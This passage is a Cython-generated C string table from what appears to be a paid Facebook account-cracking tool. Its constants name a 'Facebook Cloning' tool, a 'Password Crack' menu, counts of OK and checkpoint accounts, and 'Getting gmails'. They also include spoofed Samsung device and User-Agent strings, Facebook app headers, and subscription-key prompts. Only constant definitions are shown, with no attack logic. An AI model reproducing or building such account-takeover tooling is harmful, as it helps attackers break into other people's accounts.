    {&__pyx_kp_s_GT_S6500, __pyx_k_GT_S6500, sizeof(__pyx_k_GT_S6500), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6500D, __pyx_k_GT_S6500D, sizeof(__pyx_k_GT_S6500D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6500L, __pyx_k_GT_S6500L, sizeof(__pyx_k_GT_S6500L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6790, __pyx_k_GT_S6790, sizeof(__pyx_k_GT_S6790), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6790L, __pyx_k_GT_S6790L, sizeof(__pyx_k_GT_S6790L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6790N, __pyx_k_GT_S6790N, sizeof(__pyx_k_GT_S6790N), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6792L, __pyx_k_GT_S6792L, sizeof(__pyx_k_GT_S6792L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6800, __pyx_k_GT_S6800, sizeof(__pyx_k_GT_S6800), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6800HKAXFA, __pyx_k_GT_S6800HKAXFA, sizeof(__pyx_k_GT_S6800HKAXFA), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6802, __pyx_k_GT_S6802, sizeof(__pyx_k_GT_S6802), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6810, __pyx_k_GT_S6810, sizeof(__pyx_k_GT_S6810), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6810B, __pyx_k_GT_S6810B, sizeof(__pyx_k_GT_S6810B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6810E, __pyx_k_GT_S6810E, sizeof(__pyx_k_GT_S6810E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6810L, __pyx_k_GT_S6810L, sizeof(__pyx_k_GT_S6810L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6810M, __pyx_k_GT_S6810M, sizeof(__pyx_k_GT_S6810M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6810MBASER, __pyx_k_GT_S6810MBASER, sizeof(__pyx_k_GT_S6810MBASER), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6810P, __pyx_k_GT_S6810P, sizeof(__pyx_k_GT_S6810P), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6812, __pyx_k_GT_S6812, sizeof(__pyx_k_GT_S6812), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6812B, __pyx_k_GT_S6812B, sizeof(__pyx_k_GT_S6812B), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6812C, __pyx_k_GT_S6812C, sizeof(__pyx_k_GT_S6812C), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6812i, __pyx_k_GT_S6812i, sizeof(__pyx_k_GT_S6812i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6818, __pyx_k_GT_S6818, sizeof(__pyx_k_GT_S6818), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S6818V, __pyx_k_GT_S6818V, sizeof(__pyx_k_GT_S6818V), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7230E, __pyx_k_GT_S7230E, sizeof(__pyx_k_GT_S7230E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7233E, __pyx_k_GT_S7233E, sizeof(__pyx_k_GT_S7233E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7250D, __pyx_k_GT_S7250D, sizeof(__pyx_k_GT_S7250D), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7262, __pyx_k_GT_S7262, sizeof(__pyx_k_GT_S7262), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7270, __pyx_k_GT_S7270, sizeof(__pyx_k_GT_S7270), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7270L, __pyx_k_GT_S7270L, sizeof(__pyx_k_GT_S7270L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7272, __pyx_k_GT_S7272, sizeof(__pyx_k_GT_S7272), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7272C, __pyx_k_GT_S7272C, sizeof(__pyx_k_GT_S7272C), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7273T, __pyx_k_GT_S7273T, sizeof(__pyx_k_GT_S7273T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7278, __pyx_k_GT_S7278, sizeof(__pyx_k_GT_S7278), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7278U, __pyx_k_GT_S7278U, sizeof(__pyx_k_GT_S7278U), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7390, __pyx_k_GT_S7390, sizeof(__pyx_k_GT_S7390), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7390G, __pyx_k_GT_S7390G, sizeof(__pyx_k_GT_S7390G), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7390L, __pyx_k_GT_S7390L, sizeof(__pyx_k_GT_S7390L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7390_JZO54K, __pyx_k_GT_S7390_JZO54K, sizeof(__pyx_k_GT_S7390_JZO54K), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7392, __pyx_k_GT_S7392, sizeof(__pyx_k_GT_S7392), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7392L, __pyx_k_GT_S7392L, sizeof(__pyx_k_GT_S7392L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7500, __pyx_k_GT_S7500, sizeof(__pyx_k_GT_S7500), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7500ABABTU, __pyx_k_GT_S7500ABABTU, sizeof(__pyx_k_GT_S7500ABABTU), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7500ABADBT, __pyx_k_GT_S7500ABADBT, sizeof(__pyx_k_GT_S7500ABADBT), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7500ABTTLP, __pyx_k_GT_S7500ABTTLP, sizeof(__pyx_k_GT_S7500ABTTLP), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7500CWADBT, __pyx_k_GT_S7500CWADBT, sizeof(__pyx_k_GT_S7500CWADBT), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7500L, __pyx_k_GT_S7500L, sizeof(__pyx_k_GT_S7500L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7500T, __pyx_k_GT_S7500T, sizeof(__pyx_k_GT_S7500T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7560, __pyx_k_GT_S7560, sizeof(__pyx_k_GT_S7560), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7560M, __pyx_k_GT_S7560M, sizeof(__pyx_k_GT_S7560M), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7562, __pyx_k_GT_S7562, sizeof(__pyx_k_GT_S7562), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7562C, __pyx_k_GT_S7562C, sizeof(__pyx_k_GT_S7562C), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7562L, __pyx_k_GT_S7562L, sizeof(__pyx_k_GT_S7562L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7562i, __pyx_k_GT_S7562i, sizeof(__pyx_k_GT_S7562i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7566, __pyx_k_GT_S7566, sizeof(__pyx_k_GT_S7566), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7568, __pyx_k_GT_S7568, sizeof(__pyx_k_GT_S7568), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7568I, __pyx_k_GT_S7568I, sizeof(__pyx_k_GT_S7568I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7572, __pyx_k_GT_S7572, sizeof(__pyx_k_GT_S7572), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7580E, __pyx_k_GT_S7580E, sizeof(__pyx_k_GT_S7580E), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7583T, __pyx_k_GT_S7583T, sizeof(__pyx_k_GT_S7583T), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S758X, __pyx_k_GT_S758X, sizeof(__pyx_k_GT_S758X), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7592, __pyx_k_GT_S7592, sizeof(__pyx_k_GT_S7592), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7710, __pyx_k_GT_S7710, sizeof(__pyx_k_GT_S7710), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7710L, __pyx_k_GT_S7710L, sizeof(__pyx_k_GT_S7710L), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7898, __pyx_k_GT_S7898, sizeof(__pyx_k_GT_S7898), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7898I, __pyx_k_GT_S7898I, sizeof(__pyx_k_GT_S7898I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S8500, __pyx_k_GT_S8500, sizeof(__pyx_k_GT_S8500), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S8530, __pyx_k_GT_S8530, sizeof(__pyx_k_GT_S8530), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S8600, __pyx_k_GT_S8600, sizeof(__pyx_k_GT_S8600), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_STB919, __pyx_k_GT_STB919, sizeof(__pyx_k_GT_STB919), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_T140, __pyx_k_GT_T140, sizeof(__pyx_k_GT_T140), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_T150, __pyx_k_GT_T150, sizeof(__pyx_k_GT_T150), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_V8a, __pyx_k_GT_V8a, sizeof(__pyx_k_GT_V8a), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_V8i, __pyx_k_GT_V8i, sizeof(__pyx_k_GT_V8i), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_VC818, __pyx_k_GT_VC818, sizeof(__pyx_k_GT_VC818), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_VM919S, __pyx_k_GT_VM919S, sizeof(__pyx_k_GT_VM919S), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_W131, __pyx_k_GT_W131, sizeof(__pyx_k_GT_W131), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_W153, __pyx_k_GT_W153, sizeof(__pyx_k_GT_W153), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_X831, __pyx_k_GT_X831, sizeof(__pyx_k_GT_X831), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_X853, __pyx_k_GT_X853, sizeof(__pyx_k_GT_X853), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_X870, __pyx_k_GT_X870, sizeof(__pyx_k_GT_X870), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_X890, __pyx_k_GT_X890, sizeof(__pyx_k_GT_X890), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_Y8750, __pyx_k_GT_Y8750, sizeof(__pyx_k_GT_Y8750), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_g900f, __pyx_k_GT_g900f, sizeof(__pyx_k_GT_g900f), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_i8700, __pyx_k_GT_i8700, sizeof(__pyx_k_GT_i8700), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_i9040, __pyx_k_GT_i9040, sizeof(__pyx_k_GT_i9040), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_m190, __pyx_k_GT_m190, sizeof(__pyx_k_GT_m190), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_mini, __pyx_k_GT_mini, sizeof(__pyx_k_GT_mini), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_s5233w, __pyx_k_GT_s5233w, sizeof(__pyx_k_GT_s5233w), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_s5260, __pyx_k_GT_s5260, sizeof(__pyx_k_GT_s5260), 0, 0, 1, 0},
    {&__pyx_kp_s_Getting_gmails, __pyx_k_Getting_gmails, sizeof(__pyx_k_Getting_gmails), 0, 0, 1, 0},
    {&__pyx_n_s_H, __pyx_k_H, sizeof(__pyx_k_H), 0, 0, 1, 1},
    {&__pyx_kp_s_Hi_ZEA_Sir_I_Need_To_Buy_Your_Pa, __pyx_k_Hi_ZEA_Sir_I_Need_To_Buy_Your_Pa, sizeof(__pyx_k_Hi_ZEA_Sir_I_Need_To_Buy_Your_Pa), 0, 0, 1, 0},
    {&__pyx_n_s_Host, __pyx_k_Host, sizeof(__pyx_k_Host), 0, 0, 1, 1},
    {&__pyx_kp_s_How_many_passwords_do_you_want, __pyx_k_How_many_passwords_do_you_want, sizeof(__pyx_k_How_many_passwords_do_you_want), 0, 0, 1, 0},
    {&__pyx_n_s_I, __pyx_k_I, sizeof(__pyx_k_I), 0, 0, 1, 1},
    {&__pyx_n_s_IndexError, __pyx_k_IndexError, sizeof(__pyx_k_IndexError), 0, 0, 1, 1},
    {&__pyx_kp_s_Installing_missing_modules, __pyx_k_Installing_missing_modules, sizeof(__pyx_k_Installing_missing_modules), 0, 0, 1, 0},
    {&__pyx_n_s_J, __pyx_k_J, sizeof(__pyx_k_J), 0, 0, 1, 1},
    {&__pyx_n_s_K, __pyx_k_K, sizeof(__pyx_k_K), 0, 0, 1, 1},
    {&__pyx_kp_s_Key, __pyx_k_Key, sizeof(__pyx_k_Key), 0, 0, 1, 0},
    {&__pyx_n_s_Khan, __pyx_k_Khan, sizeof(__pyx_k_Khan), 0, 0, 1, 1},
    {&__pyx_n_s_L, __pyx_k_L, sizeof(__pyx_k_L), 0, 0, 1, 1},
    {&__pyx_n_s_Last, __pyx_k_Last, sizeof(__pyx_k_Last), 0, 0, 1, 1},
    {&__pyx_n_s_Liger, __pyx_k_Liger, sizeof(__pyx_k_Liger), 0, 0, 1, 1},
    {&__pyx_kp_s_Login_approval, __pyx_k_Login_approval, sizeof(__pyx_k_Login_approval), 0, 0, 1, 0},
    {&__pyx_n_s_M, __pyx_k_M, sizeof(__pyx_k_M), 0, 0, 1, 1},
    {&__pyx_n_s_Main, __pyx_k_Main, sizeof(__pyx_k_Main), 0, 0, 1, 1},
    {&__pyx_kp_s_Massage_Your_Key_Not_Registered, __pyx_k_Massage_Your_Key_Not_Registered, sizeof(__pyx_k_Massage_Your_Key_Not_Registered), 0, 0, 1, 0},
    {&__pyx_kp_s_Mobile_Safari_533_1, __pyx_k_Mobile_Safari_533_1, sizeof(__pyx_k_Mobile_Safari_533_1), 0, 0, 1, 0},
    {&__pyx_kp_s_Mobile_Safari_537_36, __pyx_k_Mobile_Safari_537_36, sizeof(__pyx_k_Mobile_Safari_537_36), 0, 0, 1, 0},
    {&__pyx_n_s_ModuleNotFoundError, __pyx_k_ModuleNotFoundError, sizeof(__pyx_k_ModuleNotFoundError), 0, 0, 1, 1},
    {&__pyx_kp_s_Mozilla_5_0_Linux_Android_6_0_1, __pyx_k_Mozilla_5_0_Linux_Android_6_0_1, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_6_0_1), 0, 0, 1, 0},
    {&__pyx_kp_s_Mozilla_5_0_Linux_U_Android, __pyx_k_Mozilla_5_0_Linux_U_Android, sizeof(__pyx_k_Mozilla_5_0_Linux_U_Android), 0, 0, 1, 0},
    {&__pyx_n_s_N, __pyx_k_N, sizeof(__pyx_k_N), 0, 0, 1, 1},
    {&__pyx_n_s_Name, __pyx_k_Name, sizeof(__pyx_k_Name), 0, 0, 1, 1},
    {&__pyx_kp_s_No_internet_connection, __pyx_k_No_internet_connection, sizeof(__pyx_k_No_internet_connection), 0, 0, 1, 0},
    {&__pyx_kp_s_Not_A_Brand_v_99_Chromium_v_100, __pyx_k_Not_A_Brand_v_99_Chromium_v_100, sizeof(__pyx_k_Not_A_Brand_v_99_Chromium_v_100), 0, 0, 1, 0},
    {&__pyx_n_s_O, __pyx_k_O, sizeof(__pyx_k_O), 0, 0, 1, 1},
    {&__pyx_kp_u_OAuth, __pyx_k_OAuth, sizeof(__pyx_k_OAuth), 0, 1, 0, 0},
    {&__pyx_kp_s_Option_not_found_in_menu, __pyx_k_Option_not_found_in_menu, sizeof(__pyx_k_Option_not_found_in_menu), 0, 0, 1, 0},
    {&__pyx_n_s_P, __pyx_k_P, sizeof(__pyx_k_P), 0, 0, 1, 1},
    {&__pyx_kp_s_Press_enter_to_back, __pyx_k_Press_enter_to_back, sizeof(__pyx_k_Press_enter_to_back), 0, 0, 1, 0},
    {&__pyx_kp_s_Press_enter_to_back_menu, __pyx_k_Press_enter_to_back_menu, sizeof(__pyx_k_Press_enter_to_back_menu), 0, 0, 1, 0},
    {&__pyx_kp_s_Put_file_example_sdcard_File_tx, __pyx_k_Put_file_example_sdcard_File_tx, sizeof(__pyx_k_Put_file_example_sdcard_File_tx), 0, 0, 1, 0},
    {&__pyx_kp_s_Put_file_path_1_37m, __pyx_k_Put_file_path_1_37m, sizeof(__pyx_k_Put_file_path_1_37m), 0, 0, 1, 0},
    {&__pyx_kp_s_Put_first_name, __pyx_k_Put_first_name, sizeof(__pyx_k_Put_first_name), 0, 0, 1, 0},
    {&__pyx_kp_s_Put_last_name, __pyx_k_Put_last_name, sizeof(__pyx_k_Put_last_name), 0, 0, 1, 0},
    {&__pyx_kp_s_Put_limit, __pyx_k_Put_limit, sizeof(__pyx_k_Put_limit), 0, 0, 1, 0},
    {&__pyx_kp_u_Put_password, __pyx_k_Put_password, sizeof(__pyx_k_Put_password), 0, 1, 0, 0},
    {&__pyx_n_s_Q, __pyx_k_Q, sizeof(__pyx_k_Q), 0, 0, 1, 1},
    {&__pyx_n_s_R, __pyx_k_R, sizeof(__pyx_k_R), 0, 0, 1, 1},
    {&__pyx_n_s_Random, __pyx_k_Random, sizeof(__pyx_k_Random), 0, 0, 1, 1},
    {&__pyx_kp_s_Run_python_ZEA_py, __pyx_k_Run_python_ZEA_py, sizeof(__pyx_k_Run_python_ZEA_py), 0, 0, 1, 0},
    {&__pyx_n_s_S, __pyx_k_S, sizeof(__pyx_k_S), 0, 0, 1, 1},
    {&__pyx_kp_s_SM_A500FU_MMB29M, __pyx_k_SM_A500FU_MMB29M, sizeof(__pyx_k_SM_A500FU_MMB29M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_A500F_LRX22G, __pyx_k_SM_A500F_LRX22G, sizeof(__pyx_k_SM_A500F_LRX22G), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_A500F_MMB29M, __pyx_k_SM_A500F_MMB29M, sizeof(__pyx_k_SM_A500F_MMB29M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_A500H_MMB29M, __pyx_k_SM_A500H_MMB29M, sizeof(__pyx_k_SM_A500H_MMB29M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G900F_KOT49H, __pyx_k_SM_G900F_KOT49H, sizeof(__pyx_k_SM_G900F_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G920F_MMB29K, __pyx_k_SM_G920F_MMB29K, sizeof(__pyx_k_SM_G920F_MMB29K), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G920F_NRD90M, __pyx_k_SM_G920F_NRD90M, sizeof(__pyx_k_SM_G920F_NRD90M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G930F_NRD90M, __pyx_k_SM_G930F_NRD90M, sizeof(__pyx_k_SM_G930F_NRD90M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G935F_MMB29K, __pyx_k_SM_G935F_MMB29K, sizeof(__pyx_k_SM_G935F_MMB29K), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G935F_NRD90M, __pyx_k_SM_G935F_NRD90M, sizeof(__pyx_k_SM_G935F_NRD90M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G950F_NRD90M, __pyx_k_SM_G950F_NRD90M, sizeof(__pyx_k_SM_G950F_NRD90M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320FN_LMY47V, __pyx_k_SM_J320FN_LMY47V, sizeof(__pyx_k_SM_J320FN_LMY47V), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320F_LMY4, __pyx_k_SM_J320F_LMY4, sizeof(__pyx_k_SM_J320F_LMY4), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320F_LMY47V, __pyx_k_SM_J320F_LMY47V, sizeof(__pyx_k_SM_J320F_LMY47V), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320H_LMY47V, __pyx_k_SM_J320H_LMY47V, sizeof(__pyx_k_SM_J320H_LMY47V), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320M_LMY47V, __pyx_k_SM_J320M_LMY47V, sizeof(__pyx_k_SM_J320M_LMY47V), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J510FN_MMB29M, __pyx_k_SM_J510FN_MMB29M, sizeof(__pyx_k_SM_J510FN_MMB29M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J510FN_NMF2, __pyx_k_SM_J510FN_NMF2, sizeof(__pyx_k_SM_J510FN_NMF2), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J510FN_NMF26X, __pyx_k_SM_J510FN_NMF26X, sizeof(__pyx_k_SM_J510FN_NMF26X), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J510FN_NMF26X_2, __pyx_k_SM_J510FN_NMF26X_2, sizeof(__pyx_k_SM_J510FN_NMF26X_2), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J701F_NRD90M, __pyx_k_SM_J701F_NRD90M, sizeof(__pyx_k_SM_J701F_NRD90M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J701F_NRD90M_2, __pyx_k_SM_J701F_NRD90M_2, sizeof(__pyx_k_SM_J701F_NRD90M_2), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T111_JDQ39, __pyx_k_SM_T111_JDQ39, sizeof(__pyx_k_SM_T111_JDQ39), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T230_KOT49H, __pyx_k_SM_T230_KOT49H, sizeof(__pyx_k_SM_T230_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T231_KOT49H, __pyx_k_SM_T231_KOT49H, sizeof(__pyx_k_SM_T231_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T235_KOT4, __pyx_k_SM_T235_KOT4, sizeof(__pyx_k_SM_T235_KOT4), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T310_KOT49H, __pyx_k_SM_T310_KOT49H, sizeof(__pyx_k_SM_T310_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T311_KOT4, __pyx_k_SM_T311_KOT4, sizeof(__pyx_k_SM_T311_KOT4), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T311_KOT49H, __pyx_k_SM_T311_KOT49H, sizeof(__pyx_k_SM_T311_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T315_JDQ39, __pyx_k_SM_T315_JDQ39, sizeof(__pyx_k_SM_T315_JDQ39), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T525_KOT49H, __pyx_k_SM_T525_KOT49H, sizeof(__pyx_k_SM_T525_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T531_KOT49H, __pyx_k_SM_T531_KOT49H, sizeof(__pyx_k_SM_T531_KOT49H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T531_LRX22G, __pyx_k_SM_T531_LRX22G, sizeof(__pyx_k_SM_T531_LRX22G), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T535_LRX22G, __pyx_k_SM_T535_LRX22G, sizeof(__pyx_k_SM_T535_LRX22G), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T555_LRX22G, __pyx_k_SM_T555_LRX22G, sizeof(__pyx_k_SM_T555_LRX22G), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T561_KTU84P, __pyx_k_SM_T561_KTU84P, sizeof(__pyx_k_SM_T561_KTU84P), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T705_LRX22G, __pyx_k_SM_T705_LRX22G, sizeof(__pyx_k_SM_T705_LRX22G), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T705_LRX22G_2, __pyx_k_SM_T705_LRX22G_2, sizeof(__pyx_k_SM_T705_LRX22G_2), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T805_LRX22G, __pyx_k_SM_T805_LRX22G, sizeof(__pyx_k_SM_T805_LRX22G), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T820_NRD90M, __pyx_k_SM_T820_NRD90M, sizeof(__pyx_k_SM_T820_NRD90M), 0, 0, 1, 0},
    {&__pyx_kp_s_SPH_L720_KOT49H, __pyx_k_SPH_L720_KOT49H, sizeof(__pyx_k_SPH_L720_KOT49H), 0, 0, 1, 0},
    {&__pyx_n_s_Sabir, __pyx_k_Sabir, sizeof(__pyx_k_Sabir), 0, 0, 1, 1},
    {&__pyx_kp_s_Select_Password_Crack_menu, __pyx_k_Select_Password_Crack_menu, sizeof(__pyx_k_Select_Password_Crack_menu), 0, 0, 1, 0},
    {&__pyx_n_s_Session, __pyx_k_Session, sizeof(__pyx_k_Session), 0, 0, 1, 1},
    {&__pyx_kp_s_Status_1_91mTrail_1_37m_1_31m_1, __pyx_k_Status_1_91mTrail_1_37m_1_31m_1, sizeof(__pyx_k_Status_1_91mTrail_1_37m_1_31m_1), 0, 0, 1, 0},
    {&__pyx_n_s_T, __pyx_k_T, sizeof(__pyx_k_T), 0, 0, 1, 1},
    {&__pyx_kp_u_TL_tl, __pyx_k_TL_tl, sizeof(__pyx_k_TL_tl), 0, 1, 0, 0},
    {&__pyx_kp_s_Thanks_for_use, __pyx_k_Thanks_for_use, sizeof(__pyx_k_Thanks_for_use), 0, 0, 1, 0},
    {&__pyx_kp_s_The_process_has_completed, __pyx_k_The_process_has_completed, sizeof(__pyx_k_The_process_has_completed), 0, 0, 1, 0},
    {&__pyx_n_s_ThreadPoolExecutor, __pyx_k_ThreadPoolExecutor, sizeof(__pyx_k_ThreadPoolExecutor), 0, 0, 1, 1},
    {&__pyx_kp_s_Tools_Facebook_Cloning, __pyx_k_Tools_Facebook_Cloning, sizeof(__pyx_k_Tools_Facebook_Cloning), 0, 0, 1, 0},
    {&__pyx_kp_s_Total_OK_CP_2F, __pyx_k_Total_OK_CP_2F, sizeof(__pyx_k_Total_OK_CP_2F), 0, 0, 1, 0},
    {&__pyx_kp_s_Total_account_1_32m, __pyx_k_Total_account_1_32m, sizeof(__pyx_k_Total_account_1_32m), 0, 0, 1, 0},
    {&__pyx_kp_s_Total_account_1_37m, __pyx_k_Total_account_1_37m, sizeof(__pyx_k_Total_account_1_37m), 0, 0, 1, 0},
    {&__pyx_kp_s_Total_account_ids_1_32m, __pyx_k_Total_account_ids_1_32m, sizeof(__pyx_k_Total_account_ids_1_32m), 0, 0, 1, 0},
    {&__pyx_kp_s_Try_method_2_3_for_best_results, __pyx_k_Try_method_2_3_for_best_results, sizeof(__pyx_k_Try_method_2_3_for_best_results), 0, 0, 1, 0},
    {&__pyx_n_s_U, __pyx_k_U, sizeof(__pyx_k_U), 0, 0, 1, 1},
    {&__pyx_kp_s_User_Agent, __pyx_k_User_Agent, sizeof(__pyx_k_User_Agent), 0, 0, 1, 0},
    {&__pyx_n_s_V, __pyx_k_V, sizeof(__pyx_k_V), 0, 0, 1, 1},
    {&__pyx_n_s_ValueError, __pyx_k_ValueError, sizeof(__pyx_k_ValueError), 0, 0, 1, 1},
    {&__pyx_n_s_W, __pyx_k_W, sizeof(__pyx_k_W), 0, 0, 1, 1},
    {&__pyx_n_s_X, __pyx_k_X, sizeof(__pyx_k_X), 0, 0, 1, 1},
    {&__pyx_kp_s_X_FB_Connection_Bandwidth, __pyx_k_X_FB_Connection_Bandwidth, sizeof(__pyx_k_X_FB_Connection_Bandwidth), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_Connection_Type, __pyx_k_X_FB_Connection_Type, sizeof(__pyx_k_X_FB_Connection_Type), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_Friendly_Name, __pyx_k_X_FB_Friendly_Name, sizeof(__pyx_k_X_FB_Friendly_Name), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_HTTP_Engine, __pyx_k_X_FB_HTTP_Engine, sizeof(__pyx_k_X_FB_HTTP_Engine), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_Net_HNI, __pyx_k_X_FB_Net_HNI, sizeof(__pyx_k_X_FB_Net_HNI), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_SIM_HNI, __pyx_k_X_FB_SIM_HNI, sizeof(__pyx_k_X_FB_SIM_HNI), 0, 0, 1, 0},
    {&__pyx_n_s_Y, __pyx_k_Y, sizeof(__pyx_k_Y), 0, 0, 1, 1},
    {&__pyx_n_s_Yes, __pyx_k_Yes, sizeof(__pyx_k_Yes), 0, 0, 1, 1},
    {&__pyx_kp_s_Your_Subscription_Date_Expire, __pyx_k_Your_Subscription_Date_Expire, sizeof(__pyx_k_Your_Subscription_Date_Expire), 0, 0, 1, 0},
    {&__pyx_n_s_Z, __pyx_k_Z, sizeof(__pyx_k_Z), 0, 0, 1, 1},
    {&__pyx_n_s__110, __pyx_k__110, sizeof(__pyx_k__110), 0, 0, 1, 1},
    {&__pyx_kp_u__20, __pyx_k__20, sizeof(__pyx_k__20), 0, 1, 0, 0},
    {&__pyx_kp_s__22, __pyx_k__22, sizeof(__pyx_k__22), 0, 0, 1, 0},
    {&__pyx_kp_u__22, __pyx_k__22, sizeof(__pyx_k__22), 0, 1, 0, 0},
